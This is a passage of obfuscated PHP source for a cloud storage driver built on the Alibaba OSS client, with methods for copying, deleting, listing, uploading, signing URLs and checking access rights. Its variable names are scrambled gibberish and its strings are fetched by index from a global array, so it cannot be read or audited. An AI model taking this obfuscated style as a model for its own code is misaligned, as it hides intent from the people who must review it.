array($±şŠî[32] => $¤ÙÜ©œó, $±şŠî[76] => $ã©“øÄà, $±şŠî[203] => strtotime($¦Ò”÷Ö)) : $¤ÙÜ©œó; $ùøœÙ€ = $ã©“øÄà == 0 && substr($¤ÙÜ©œó, strlen($¤ÙÜ©œó) - 1, 1) == $±şŠî[8] ? !0 : !1; $¢ˆ›­ÅË = array($±şŠî[76] => $ã©“øÄà, $±şŠî[1420] => $ã©“øÄà, $±şŠî[85] => strtotime($¦Ò”÷Ö), $±şŠî[1421] => $¦Ò”÷Ö); $this->cacheMethodInfoSet($¤ÙÜ©œó, $ùøœÙ€, $¢ˆ›­ÅË); if ($ùøœÙ€) { $€¢–Ø¦[] = $¤ÙÜ©œó; continue; } $¿ÓÆÃ ı[] = $îæ—•£; } foreach ($Ÿì“ıÈ¥ as $Ò„â½äæ) { $€¢–Ø¦[] = $Ò„â½äæ->getPrefix(); $this->cacheMethodInfoSet($Ò„â½äæ->getPrefix(), !0); } if ($²´»¥Š¶ === $±şŠî[12]) { break; } } $this->cacheMethodInfoSet($­Ñ’ğÙİ, !0); return array($±şŠî[82] => $€¢–Ø¦, $±şŠî[83] => $¿ÓÆÃ ı); } public function copyFile($‹é¨ö‘·, $ˆòá­ìÇ) { $¯ñöÛ˜— = $this->size($‹é¨ö‘·); if ($¯ñöÛ˜— < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‹é¨ö‘·, $this->bucket, $this->pathEncode($ˆòá­ìÇ)); } catch (OSS\Core\OssException $¦îå˜Ÿ¹) { return !1; } return $this->getPathOuter($ˆòá­ìÇ); } $ØÏŞÚô = $this->multiCopyObject($‹é¨ö‘·, $ˆòá­ìÇ, $¯ñöÛ˜—); return $ØÏŞÚô ? $this->getPathOuter($ˆòá­ìÇ) : !1; } private function multiCopyObject($İéú¢”‰, $éÆÄä·ß, $ÏüØˆ»ß) { $áµ®€¬ì =& $_SERVER[Ã¶¡¶„æ]; try { $ì´Şêİ€ = array(); if ($§‰…ììÏ = $this->hashMd5($İéú¢”‰)) { $ì´Şêİ€ = array(OSS\OssClient::OSS_HEADERS => array($áµ®€¬ì[1422] => $§‰…ììÏ)); } $âúù±–õ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($éÆÄä·ß), $ì´Şêİ€); $ã¼íùƒ  = 1; $úÎ›™ö = 0; $Âª÷›æÑ = array(); $ï›¢ ô¦ = 1024 * 1024 * 10; $£Õ§˜Ÿ² = $this->client->generateMultiuploadParts($ÏüØˆ»ß, $ï›¢ ô¦); foreach ($£Õ§˜Ÿ² as $²ÉæÑ => $¿–å¾ìµ) { $§•¤¥¾÷ = $úÎ›™ö + (int) $¿–å¾ìµ[$áµ®€¬ì[1423]]; $²Ûø•öˆ = (int) $¿–å¾ìµ[$áµ®€¬ì[337]] + $§•¤¥¾÷ - 1; $Áô›˜¯ = array($áµ®€¬ì[1424] => $§•¤¥¾÷, $áµ®€¬ì[1425] => $²Ûø•öˆ); $Âª÷›æÑ[] = $this->client->uploadPartCopy($this->bucket, $İéú¢”‰, $this->bucket, $this->pathEncode($éÆÄä·ß), $ã¼íùƒ , $âúù±–õ, $Áô›˜¯); $ã¼íùƒ  = $ã¼íùƒ  + 1; } $ïÓÉƒÌ = array(); foreach ($Âª÷›æÑ as $²ÉæÑ => $¡Ì·òâÈ) { $ïÓÉƒÌ[] = array($áµ®€¬ì[1426] => $²ÉæÑ + 1, $áµ®€¬ì[1427] => $¡Ì·òâÈ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($éÆÄä·ß), $âúù±–õ, $ïÓÉƒÌ); } catch (OSS\Core\OssException $«¸×ƒ÷ş) { return !1; } return !0; } public function moveFile($‹•ÜÌ‹, $ùñ­¹Ğ±) { if ($this->copyFile($‹•ÜÌ‹, $ùñ­¹Ğ±)) { $this->remove($‹•ÜÌ‹); return $this->getPathOuter($ùñ­¹Ğ±); } return !1; } public function delFile($úéèÆ½¢) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($úéèÆ½¢)); } catch (OSS\Core\OssException $¬ƒ¹¿ˆ‡) { return !1; } return !0; } public function delFolder($±¼ºİÓÏ) { $²ÖÇÅÇ‘ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->exist($±¼ºİÓÏ)) { return !0; } $this->listItemCache = !1; $Î—õæï = $this->fileList($±¼ºİÓÏ); $this->listItemCache = !0; $ìŠ œû = trim($±¼ºİÓÏ, $²ÖÇÅÇ‘[8]) . $²ÖÇÅÇ‘[8]; if (!empty($±¼ºİÓÏ) && $±¼ºİÓÏ !== $²ÖÇÅÇ‘[197] && !in_array($ìŠ œû, $Î—õæï[$²ÖÇÅÇ‘[82]])) { $Î—õæï[$²ÖÇÅÇ‘[82]][] = $ìŠ œû; } $¤¢Îš‰ = $this->delByBatch($Î—õæï[$²ÖÇÅÇ‘[83]]); if (!$¤¢Îš‰) { return !1; } $¤¢Îš‰ = $this->delByBatch($Î—õæï[$²ÖÇÅÇ‘[82]]); if (!$¤¢Îš‰) { return !1; } return $this->delFile($ìŠ œû); } private function delByBatch($è±¸ù«£) { foreach (array_chunk($è±¸ù«£, 1000) as $‚·íÑÌ”) { try { $this->client->deleteObjects($this->bucket, $‚·íÑÌ”); } catch (OSS\Core\OssException $‡µÓ¸½³) { return !1; } } return !0; } public function rename($ëÅ˜ğÂ¹, $¸¾Ğœä) { return $this->renameObject($ëÅ˜ğÂ¹, $¸¾Ğœä); } private function fileInfo($â½ÛÃ³ñ, $ğ³ç³Âª = false, $ûÑø˜İ› = array()) { $Ğ´·ßÃ§ =& $_SERVER[Ã¶¡¶„æ]; $¯Ë™ÅÏ„ = array($Ğ´·ßÃ§[32] => $this->pathThis($â½ÛÃ³ñ), $Ğ´·ßÃ§[84] => $this->getPathOuter($â½ÛÃ³ñ), $Ğ´·ßÃ§[33] => $Ğ´·ßÃ§[199], $Ğ´·ßÃ§[76] => isset($ûÑø˜İ›[$Ğ´·ßÃ§[76]]) ? $ûÑø˜İ›[$Ğ´·ßÃ§[76]] : 0, $Ğ´·ßÃ§[174] => $this->ext($â½ÛÃ³ñ)); if ($ğ³ç³Âª) { return $¯Ë™ÅÏ„; } $¯Ë™ÅÏ„[$Ğ´·ßÃ§[200]] = $¯Ë™ÅÏ„[$Ğ´·ßÃ§[85]] = 0; $¯Ë™ÅÏ„[$Ğ´·ßÃ§[201]] = $¯Ë™ÅÏ„[$Ğ´·ßÃ§[202]] = !0; if (empty($ûÑø˜İ›)) { $İäï—ĞÓ = $this->objectMeta($â½ÛÃ³ñ); if (!$İäï—ĞÓ) { return $¯Ë™ÅÏ„; } $ûÑø˜İ› = array($Ğ´·ßÃ§[85] => strtotime($İäï—ĞÓ[$Ğ´·ßÃ§[1421]]), $Ğ´·ßÃ§[76] => $İäï—ĞÓ[$Ğ´·ßÃ§[1420]] + 0); } if (isset($ûÑø˜İ›[$Ğ´·ßÃ§[76]])) { $¯Ë™ÅÏ„[$Ğ´·ßÃ§[76]] = $ûÑø˜İ›[$Ğ´·ßÃ§[76]]; } if (isset($ûÑø˜İ›[$Ğ´·ßÃ§[85]])) { $¯Ë™ÅÏ„[$Ğ´·ßÃ§[85]] = $ûÑø˜İ›[$Ğ´·ßÃ§[85]]; } if (isset($ûÑø˜İ›[$Ğ´·ßÃ§[203]]) && !trim($¯Ë™ÅÏ„[$Ğ´·ßÃ§[85]])) { $¯Ë™ÅÏ„[$Ğ´·ßÃ§[85]] = $ûÑø˜İ›[$Ğ´·ßÃ§[203]]; } return $¯Ë™ÅÏ„; } private function folderInfo($¨®¤éìã, $ €Ğ¾î = false, $ÖœŠÉº = array()) { $ï×ü“Ù =& $_SERVER[Ã¶¡¶„æ]; $¡¬ÔéÕã = array($ï×ü“Ù[32] => $this->pathThis($¨®¤éìã), $ï×ü“Ù[84] => $this->getPathOuter($ï×ü“Ù[8] . $¨®¤éìã), $ï×ü“Ù[33] => $ï×ü“Ù[75]); if ($ €Ğ¾î) { return $¡¬ÔéÕã; } $¡¬ÔéÕã[$ï×ü“Ù[200]] = $¡¬ÔéÕã[$ï×ü“Ù[85]] = 0; $¡¬ÔéÕã[$ï×ü“Ù[201]] = $¡¬ÔéÕã[$ï×ü“Ù[202]] = !0; if (empty($ÖœŠÉº)) { $¨®¤éìã = rtrim($¨®¤éìã, $ï×ü“Ù[8]) . $ï×ü“Ù[8]; $¿¼‚Õíª = $this->objectMeta($¨®¤éìã); if (!$¿¼‚Õíª) { return $¡¬ÔéÕã; } $ÖœŠÉº = array($ï×ü“Ù[200] => $¿¼‚Õíª[$ï×ü“Ù[511]][$ï×ü“Ù[1428]], $ï×ü“Ù[85] => strtotime($¿¼‚Õíª[$ï×ü“Ù[1421]])); } if (isset($ÖœŠÉº[$ï×ü“Ù[85]])) { $¡¬ÔéÕã[$ï×ü“Ù[85]] = $ÖœŠÉº[$ï×ü“Ù[85]]; } if (isset($ÖœŠÉº[$ï×ü“Ù[200]])) { $¡¬ÔéÕã[$ï×ü“Ù[200]] = $ÖœŠÉº[$ï×ü“Ù[200]]; } return $¡¬ÔéÕã; } public function listPath($¯ø×ı­‡, $Í‡Ù‹¾– = false) { $œ®±«ˆ¹ =& $_SERVER[Ã¶¡¶„æ]; $éö‘­ş‹ = $this->fileList($¯ø×ı­‡, $œ®±«ˆ¹[8], !0); foreach ($éö‘­ş‹[$œ®±«ˆ¹[82]] as $”§¢ûŒ‘ => $‘ÏŸï§) { $éö‘­ş‹[$œ®±«ˆ¹[82]][$”§¢ûŒ‘] = $this->folderInfo($‘ÏŸï§, $Í‡Ù‹¾–, $‘ÏŸï§); } foreach ($éö‘­ş‹[$œ®±«ˆ¹[83]] as $”§¢ûŒ‘ => $‘ÏŸï§) { $éö‘­ş‹[$œ®±«ˆ¹[83]][$”§¢ûŒ‘] = $this->fileInfo($‘ÏŸï§[$œ®±«ˆ¹[32]], $Í‡Ù‹¾–, $‘ÏŸï§); } return $éö‘­ş‹; } protected function infoChildren($¯ª–”§, &$·ûÛŒ«¹) { $îÙ¹¬½É =& $_SERVER[Ã¶¡¶„æ]; $üÀá¸À— = $this->fileList($¯ª–”§, $îÙ¹¬½É[12], !0); $·ûÛŒ«¹[$îÙ¹¬½É[78]] += count($üÀá¸À—[$îÙ¹¬½É[82]]); $·ûÛŒ«¹[$îÙ¹¬½É[77]] += count($üÀá¸À—[$îÙ¹¬½É[83]]); foreach ($üÀá¸À—[$îÙ¹¬½É[83]] as $Š‚–¢ô˜) { if (!$Š‚–¢ô˜ || !$Š‚–¢ô˜[$îÙ¹¬½É[76]]) { continue; } $·ûÛŒ«¹[$îÙ¹¬½É[76]] += $Š‚–¢ô˜[$îÙ¹¬½É[76]]; } } public function has($­¼á, $¹ü°ÏøŸ = false, $ø»‚ë“ = true) { $ÎôÃãÄë =& $_SERVER[Ã¶¡¶„æ]; $­¼á = trim($­¼á, $ÎôÃãÄë[8]); $ÂŸí£½¿ = empty($­¼á) && $­¼á !== $ÎôÃãÄë[197] ? $ÎôÃãÄë[12] : $­¼á . $ÎôÃãÄë[8]; $€…áî‘Ğ = $ÎôÃãÄë[12]; $»ãé™Ã = 500; $òÇıïá = $û¥ŸÀúó = 0; while (!0) { check_abort(); $˜øğÒí = array($ÎôÃãÄë[1416] => $ÎôÃãÄë[8], $ÎôÃãÄë[1417] => $ÂŸí£½¿, $ÎôÃãÄë[1418] => $»ãé™Ã, $ÎôÃãÄë[1419] => $€…áî‘Ğ); try { $ËášÓü’ = $this->client->listObjects($this->bucket, $˜øğÒí); } catch (OSS\Core\OssException $Á¤ŞÀèØ) { break; } $€…áî‘Ğ = $ËášÓü’->getNextMarker(); $±¡Ÿß¸¯ = $ËášÓü’->getObjectList(); $¢†×µĞ¢ = $ËášÓü’->getPrefixList(); if ($¹ü°ÏøŸ) { if (count($±¡Ÿß¸¯) > 1 || count($±¡Ÿß¸¯) == 1 && $±¡Ÿß¸¯[0]->getKey() != $ÂŸí£½¿) { $òÇıïá += count($±¡Ÿß¸¯) - 1; } if (!empty($¢†×µĞ¢)) { $û¥ŸÀúó += count($¢†×µĞ¢); } if ($€…áî‘Ğ === $ÎôÃãÄë[12]) { break; } continue; } if ($ø»‚ë“) { if (!empty($±¡Ÿß¸¯)) { if (count($±¡Ÿß¸¯) > 1 || $±¡Ÿß¸¯[0]->getKey() != $ÂŸí£½¿) { return !0; } } } else { if (!empty($¢†×µĞ¢)) { return !0; } } if ($€…áî‘Ğ === $ÎôÃãÄë[12]) { break; } } if ($¹ü°ÏøŸ) { return array($ÎôÃãÄë[207] => $òÇıïá, $ÎôÃãÄë[208] => $û¥ŸÀúó); } return !1; } public function listAll($ßİ¦ƒ ¦) { $ÉÚ™ùÊà =& $_SERVER[Ã¶¡¶„æ]; $¯º³¯û† = $this->fileList($ßİ¦ƒ ¦, $ÉÚ™ùÊà[12], !0); $²éæÒÁü = array(); foreach ($¯º³¯û†[$ÉÚ™ùÊà[83]] as $æÈËî†Å) { $²éæÒÁü[$æÈËî†Å[$ÉÚ™ùÊà[32]]] = $æÈËî†Å[$ÉÚ™ùÊà[76]]; } foreach ($¯º³¯û†[$ÉÚ™ùÊà[82]] as $æÈËî†Å) { if (is_string($æÈËî†Å)) { $²éæÒÁü[$æÈËî†Å] = 0; } } return $this->listAllFiles($ßİ¦ƒ ¦, array_keys($²éæÒÁü), $²éæÒÁü); } public function canRead($¬•ƒÎÊó) { $Èƒì†Ù„ =& $_SERVER[Ã¶¡¶„æ]; $Ôç‡¿ÀŸ = $this->pathAcl($¬•ƒÎÊó); return $Ôç‡¿ÀŸ == $Èƒì†Ù„[1429] || $Ôç‡¿ÀŸ == $Èƒì†Ù„[556] ? !0 : !1; } public function canWrite($ÖÂ¼ÊöÆ) { $¯Ù»ÛÓ’ = $this->pathAcl($ÖÂ¼ÊöÆ); return $¯Ù»ÛÓ’ == $_SERVER[Ã¶¡¶„æ][556] ? !0 : !1; } public function pathAcl($Ö›™á–ê) { $¶‹öµ‚¢ =& $_SERVER[Ã¶¡¶„æ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $­–Ä¸Âà = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ö›™á–ê)); } catch (OSS\Core\OssException $­ªãÜ ) { return !1; } $Šİâ’²½ = $­–Ä¸Âà == $¶‹öµ‚¢[37] ? $this->bucketAcl : $­–Ä¸Âà; if ($Šİâ’²½ == $¶‹öµ‚¢[1430]) { return $¶‹öµ‚¢[1429]; } if ($Šİâ’²½ == $¶‹öµ‚¢[1431]) { return $¶‹öµ‚¢[556]; } return $Šİâ’²½; } private function chmodPath($ªˆÇÈÔ”, $ø”«®èë = '') { $ñ¦€Û­ =& $_SERVER[Ã¶¡¶„æ]; $’ƒñàí… = empty($ø”«®èë) ? $ñ¦€Û­[1431] : $ø”«®èë; $¾ÌÂüí• = array($ñ¦€Û­[37], $ñ¦€Û­[198], $ñ¦€Û­[1430], $ñ¦€Û­[1431]); if (!in_array($’ƒñàí…, $¾ÌÂüí•)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªˆÇÈÔ”), $’ƒñàí…); } catch (OSS\Core\OssException $äÔø‚äµ) { return !1; } return !0; } public function getContent($è®êÅ‚¶) { return $this->fileSubstr($è®êÅ‚¶, -1); } public function setContent($ÜÀ«Âì®, $½Û¸‹Ú¦ = '') { $œŠ”­å =& $_SERVER[Ã¶¡¶„æ]; try { $¯Ó˜ø€ = $this->trafficLimit($œŠ”­å[1432]); $§‘ÅõÊˆ = $this->client->putObject($this->bucket, $this->pathEncode($ÜÀ«Âì®), $½Û¸‹Ú¦, $¯Ó˜ø€); } catch (OSS\Core\OssException $âÏ—˜îë) { return !1; } $ÎÏÆÆİª = array($œŠ”­å[1422] => trim($§‘ÅõÊˆ[$œŠ”­å[1433]], $œŠ”­å[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÜÀ«Âì®))); $this->updateObjMeta($ÜÀ«Âì®, $ÎÏÆÆİª); return isset($§‘ÅõÊˆ[$œŠ”­å[1434]][$œŠ”­å[1381]]) ? !0 : !1; } private function updateObjMeta($çáßÚ¿¦, $¿‰êŒú”) { $çáßÚ¿¦ = $this->pathEncode($çáßÚ¿¦); try { $õÈØ‰ò° = array(OSS\OssClient::OSS_HEADERS => $¿‰êŒú”); $this->client->copyObject($this->bucket, $çáßÚ¿¦, $this->bucket, $çáßÚ¿¦, $õÈØ‰ò°); } catch (OSS\Core\OssException $Ä˜ı½Æ±) { return !1; } return !0; } public function upload($ƒâ†Şã, $£²Š—Òš, $²¼ßş˜« = false, $‡©«Ü‰‹ = REPEAT_REPLACE) { $ áÇ¯Äş =& $_SERVER[Ã¶¡¶„æ]; $¦¯ÆÄÆ× = trim($ƒâ†Şã, $ áÇ¯Äş[8]); $Ûµ• = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ áÇ¯Äş[1422] => @md5_file($£²Š—Òš)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ƒâ†Şã))); $Ûµ• = $this->trafficLimit($ áÇ¯Äş[1432], $Ûµ•); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($¦¯ÆÄÆ×), $£²Š—Òš, $Ûµ•); } catch (OSS\Core\OssException $÷­ºã£¥) { return !1; } return $this->getPathOuter($ƒâ†Şã); } public function getHost() { $ÃÑ–ÒÇ« =& $_SERVER[Ã¶¡¶„æ]; $Íø³‰²Ã = explode($ÃÑ–ÒÇ«[183], parent::getHost()); return $Íø³‰²Ã[0] . $ÃÑ–ÒÇ«[183] . $this->bucket . $ÃÑ–ÒÇ«[10] . $Íø³‰²Ã[1]; } public function uploadFormData($éØ—òßò, $ ÈÖ = 3600) { $Äù“Ñãï =& $_SERVER[Ã¶¡¶„æ]; if (!($ìáõÅÒ˜ = $this->getHost())) { return !1; } $˜ä¡©†¨ = $ ÈÖ; $ ²øÂä = date($Äù“Ñãï[1435], time() + $˜ä¡©†¨); $¦ö¨â­ = new DateTime($ ²øÂä); $ÌüÅ¿™§ = $¦ö¨â­->format(DateTime::ISO8601); $’·©Í” = strpos($ÌüÅ¿™§, $Äù“Ñãï[296]); $ÌüÅ¿™§ = substr($ÌüÅ¿™§, 0, $’·©Í”) . $Äù“Ñãï[1436]; $­òÒ¥ÔÜ = 1048576000 * 5; $„Ôè½õŒ = $this->pathFather($éØ—òßò); $å“Ä„úè = array($Äù“Ñãï[1335] => $ÌüÅ¿™§, $Äù“Ñãï[1336] => array(array($Äù“Ñãï[1437], 0, $­òÒ¥ÔÜ), array($Äù“Ñãï[1339], $Äù“Ñãï[1340], $„Ôè½õŒ))); $Õ¤ü¯¿ = base64_encode(json_encode($å“Ä„úè)); $²çú‰Ùá = base64_encode(hash_hmac($Äù“Ñãï[232], $Õ¤ü¯¿, $this->secret, !0)); $œ¯ùåÈà = array($Äù“Ñãï[1345] => $Õ¤ü¯¿, $Äù“Ñãï[1438] => $this->accessKey, $Äù“Ñãï[1341] => $Äù“Ñãï[1333], $Äù“Ñãï[1439] => $²çú‰Ùá, $Äù“Ñãï[181] => $ìáõÅÒ˜); $œ¯ùåÈà = $this->trafficLimit($Äù“Ñãï[1432], $œ¯ùåÈà); return $œ¯ùåÈà; } public function multiUploadFormData($±ƒÏª©Ï, $›€öå¸Î = 3600) { $§¬ĞüÇü =& $_SERVER[Ã¶¡¶„æ]; if (!($‰¨«…ù = $this->getHost())) { return !1; } $ğë©Ù”® = $this->trafficLimit($§¬ĞüÇü[1432]); $¯âí»‰¤ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($±ƒÏª©Ï), $ğë©Ù”®); return array($§¬ĞüÇü[223] => $¯âí»‰¤, $§¬ĞüÇü[181] => $‰¨«…ù . $§¬ĞüÇü[8] . $this->pathEncode($±ƒÏª©Ï), $§¬ĞüÇü[224] => gmdate($§¬ĞüÇü[1440]), $§¬ĞüÇü[94] => $±ƒÏª©Ï); } public function multiUploadAuthData($ÏÆèş÷², $”ê†ëÁÉ = array()) { $Ç‹Ô¥ =& $_SERVER[Ã¶¡¶„æ]; $‘¿‡Ê¾ = isset($”ê†ëÁÉ[$Ç‹Ô¥[224]]) ? $”ê†ëÁÉ[$Ç‹Ô¥[224]] : gmdate($Ç‹Ô¥[1440]); $€£ë´ = isset($”ê†ëÁÉ[$Ç‹Ô¥[174]]) ? $”ê†ëÁÉ[$Ç‹Ô¥[174]] : $Ç‹Ô¥[12]; $ü†«ÏÕÇ = $ÏÆèş÷²; if (isset($”ê†ëÁÉ[$Ç‹Ô¥[94]])) { $ü†«ÏÕÇ = $”ê†ëÁÉ[$Ç‹Ô¥[94]]; unset($”ê†ëÁÉ[$Ç‹Ô¥[94]]); } if (isset($”ê†ëÁÉ[$Ç‹Ô¥[225]])) { $”ê†ëÁÉ[$Ç‹Ô¥[224]] = $‘¿‡Ê¾; return $this->listUploadParts($ü†«ÏÕÇ, $”ê†ëÁÉ); } $óû¥Õ³ñ = array($Ç‹Ô¥[226], $Ç‹Ô¥[12], $Ç‹Ô¥[120], $‘¿‡Ê¾, "\170\x2d\157\x73\x73\55\144\141\164\x65\72{$‘¿‡Ê¾}", $Ç‹Ô¥[8] . $this->bucket . $Ç‹Ô¥[8] . $ü†«ÏÕÇ . $€£ë´); if (strpos($€£ë´, $Ç‹Ô¥[227]) === 0) { $óû¥Õ³ñ[0] = $Ç‹Ô¥[228]; if ($ÕŒ¯ÊŒÄ = $this->trafficLimit($Ç‹Ô¥[1432])) { $ü†«ÏÕÇ = $Ç‹Ô¥[1441]; array_splice($óû¥Õ³ñ, 5, 0, $ü†«ÏÕÇ . $Ç‹Ô¥[4] . $ÕŒ¯ÊŒÄ[$ü†«ÏÕÇ]); } } if (isset($”ê†ëÁÉ[$Ç‹Ô¥[229]]) && $”ê†ëÁÉ[$Ç‹Ô¥[229]] == $Ç‹Ô¥[230]) { $óû¥Õ³ñ[0] = $Ç‹Ô¥[230]; } if (!empty($”ê†ëÁÉ[$Ç‹Ô¥[1442]])) { $—È³àç¹ = array_merge(array($óû¥Õ³ñ[4]), $”ê†ëÁÉ[$Ç‹Ô¥[1442]]); sort($—È³àç¹); $óû¥Õ³ñ[4] = implode($Ç‹Ô¥[231], $—È³àç¹); } $Á·¸ÜŸ = implode($Ç‹Ô¥[231], $óû¥Õ³ñ); $ˆ‚ÁÁğ¢ = base64_encode(hash_hmac($Ç‹Ô¥[232], $Á·¸ÜŸ, $this->secret, !0)); $üé¿”—ˆ = $Ç‹Ô¥[1406] . $this->accessKey . $Ç‹Ô¥[4] . $ˆ‚ÁÁğ¢; if (strpos($€£ë´, $Ç‹Ô¥[227]) === 0) { $üé¿”—ˆ = array($Ç‹Ô¥[234] => $üé¿”—ˆ, $Ç‹Ô¥[224] => $‘¿‡Ê¾); if ($ÕŒ¯ÊŒÄ) { $üé¿”—ˆ = array_merge($üé¿”—ˆ, $ÕŒ¯ÊŒÄ); } } return $üé¿”—ˆ; } public function listUploadParts($œîÎ½­, $‚İØ®¼¬) { $èÈÜóÚ =& $_SERVER[Ã¶¡¶„æ]; $ú¿ë™á = parse_url_query($‚İØ®¼¬[$èÈÜóÚ[174]]); $–ˆÙñ² = $this->client->listParts($this->bucket, $this->pathEncode($œîÎ½­), $ú¿ë™á[$èÈÜóÚ[223]]); $Æ½¯öë = $–ˆÙñ²->getListPart(); $½ú€Øì = array(); foreach ($Æ½¯öë as $‡˜³ìì) { $½ú€Øì[] = array($èÈÜóÚ[1426] => $‡˜³ìì->getPartNumber(), $èÈÜóÚ[1427] => trim($‡˜³ìì->getETag(), $èÈÜóÚ[118])); } unset($‚İØ®¼¬[$èÈÜóÚ[225]], $‚İØ®¼¬[$èÈÜóÚ[229]]); $ Öˆı÷ = $this->multiUploadAuthData($œîÎ½­, $‚İØ®¼¬); if (empty($ Öˆı÷)) { return !1; } return array($èÈÜóÚ[234] => $ Öˆı÷, $èÈÜóÚ[224] => $‚İØ®¼¬[$èÈÜóÚ[224]], $èÈÜóÚ[236] => $½ú€Øì); } public function download($§µë‹¿€, $ºÍ’¸ü½) { if ($this->isFolder($§µë‹¿€)) { return !1; } try { $Ãî·€™  = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ºÍ’¸ü½); $Ãî·€™  = $this->trafficLimit($_SERVER[Ã¶¡¶„æ][109], $Ãî·€™ ); $this->client->getObject($this->bucket, $this->pathEncode($§µë‹¿€), $Ãî·€™ ); } catch (OSS\Core\OssException $‡ëÕÏ½) { return !1; } return $ºÍ’¸ü½; } public function fileSubstr($í£êˆËè, $…şúœ¸ = 0, $Ó½—†„Å = false) { if ($…şúœ¸ === -1) { $âÇÌû÷ˆ = array(); } else { if ($Ó½—†„Å === !1) { $Œ¯¥¸• = $this->size($í£êˆËè); } else { $Œ¯¥¸• = $…şúœ¸ + $Ó½—†„Å - 1; } $âÇÌû÷ˆ = array(OSS\OssClient::OSS_RANGE => "{$…şúœ¸}\55{$Œ¯¥¸•}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($í£êˆËè), $âÇÌû÷ˆ); } catch (OSS\Core\OssException $‡ÆŞô¦Ú) { think_exception($‡ÆŞô¦Ú->getMessage()); return !1; } } private function trafficLimit($®û’ºû–, $ûÅäÂôŒ = array()) { $Ü¥‡”œ =& $_SERVER[Ã¶¡¶„æ]; if ($®û’ºû– == $Ü¥‡”œ[1432] && $this->isUploadServer() || $®û’ºû– == $Ü¥‡”œ[109] && $this->isFileOutServer()) { return $ûÅäÂôŒ; } $¡öŒûéä = floatval($GLOBALS[$Ü¥‡”œ[6]][$Ü¥‡”œ[89]][$Ü¥‡”œ[107]][$®û’ºû–]) * 1024 * 1024 * 8; if (!$¡öŒûéä) { return $ûÅäÂôŒ; } $¡öŒûéä = $¡öŒûéä < 819200 ? 819200 : ($¡öŒûéä > 838860800 ? 838860800 : $¡öŒûéä); $ûÅäÂôŒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¡öŒûéä); return $ûÅäÂôŒ; } public function link($±¾‰Ò•¦, $È¬ğ×Ô = array()) { $üÑ¦´ËÕ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->exist($±¾‰Ò•¦) || $this->isFolder($±¾‰Ò•¦)) { return !1; } try { $È¬ğ×Ô = $this->trafficLimit($üÑ¦´ËÕ[109], $È¬ğ×Ô); $è»ä‰› = $this->client->signUrl($this->bucket, $this->pathEncode($±¾‰Ò•¦), 3600 * 12, $üÑ¦´ËÕ[230], $È¬ğ×Ô); return $this->getCdnLink($è»ä‰›); } catch (OSS\Core\OssException $€¢ÊÂ…) { return !1; } } public function fileOut($š­¤‡, $æ£ÆƒÊ = false, $§í¾ÌÎò = false, $œàœâ«Œ = '') { $“´š¢¤Ğ =& $_SERVER[Ã¶¡¶„æ]; if ($this->isFileOutServer()) { return $this->fileOutServer($š­¤‡, $æ£ÆƒÊ, $§í¾ÌÎò, $œàœâ«Œ); } if (!$§í¾ÌÎò) { $§í¾ÌÎò = $this->pathThis($š­¤‡); } $§í¾ÌÎò = rawurlencode($§í¾ÌÎò); $†¯¨‹üÖ = get_file_mime(get_path_ext($§í¾ÌÎò)); if ($†¯¨‹üÖ == $“´š¢¤Ğ[217]) { return parent::fileOut($š­¤‡, $æ£ÆƒÊ, $§í¾ÌÎò, $œàœâ«Œ); } $æ£ÆƒÊ = $æ£ÆƒÊ ? $“´š¢¤Ğ[1443] : $“´š¢¤Ğ[1444]; $²±˜ƒ®¶ = array(OSS\OssClient::OSS_SUB_RESOURCE => $“´š¢¤Ğ[1445] . rawurlencode("{$æ£ÆƒÊ}\x3b\x66\x69\x6c\x65\156\141\x6d\145\x3d{$§í¾ÌÎò}")); $²±˜ƒ®¶[OSS\OssClient::OSS_SUB_RESOURCE] .= $“´š¢¤Ğ[1446] . rawurlencode($†¯¨‹üÖ); $Ç«”íßŞ = $this->link($š­¤‡, $²±˜ƒ®¶); $this->fileOutLink($Ç«”íßŞ); } public function fileOutServer($ÒÁªßë, $àë ÈòĞ = false, $£şÄ•å = false, $¥«­øĞĞ = '') { parent::fileOut($ÒÁªßë, $àë ÈòĞ, $£şÄ•å, $¥«­øĞĞ); } public function fileOutImage($øıíÕ«, $«ÏÑû­€ = 250) { $ØãÁ”×Ú = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ã¶¡¶„æ][1447] . $«ÏÑû­€); $è˜³Í¨š = $this->link($øıíÕ«, $ØãÁ”×Ú); $this->fileOutLink($è˜³Í¨š); } public function fileOutImageServer($ìÔ‹‰é³, $¿­¿—¹¾ = 250) { parent::fileOutImage($ìÔ‹‰é³, $¿­¿—¹¾); } public function fileOutLink($Î÷¥¹«µ) { $«¨ò• =& $_SERVER[Ã¶¡¶„æ]; if (!$this->isCdnHost() && substr($Î÷¥¹«µ, 0, 7) == $«¨ò•[1348]) { $Î÷¥¹«µ = $«¨ò•[1349] . substr($Î÷¥¹«µ, 7); } header($«¨ò•[161] . $Î÷¥¹«µ); die; } public function hashMd5($´ñ·—ù, $şÔ­óÚ = '') { $¬ñÒ´Ï§ =& $_SERVER[Ã¶¡¶„æ]; $ÓÅ‹ûü = $this->_objectMeta($´ñ·—ù); if (!$ÓÅ‹ûü) { return $¬ñÒ´Ï§[12]; } if (!isset($ÓÅ‹ûü[$¬ñÒ´Ï§[1422]]) && !empty($şÔ­óÚ)) { $ú¡Ü•Ô‘ = $this->updateObjMeta($´ñ·—ù, array($¬ñÒ´Ï§[1422] => $şÔ­óÚ)); $ÓÅ‹ûü[$¬ñÒ´Ï§[1422]] = $ú¡Ü•Ô‘ ? 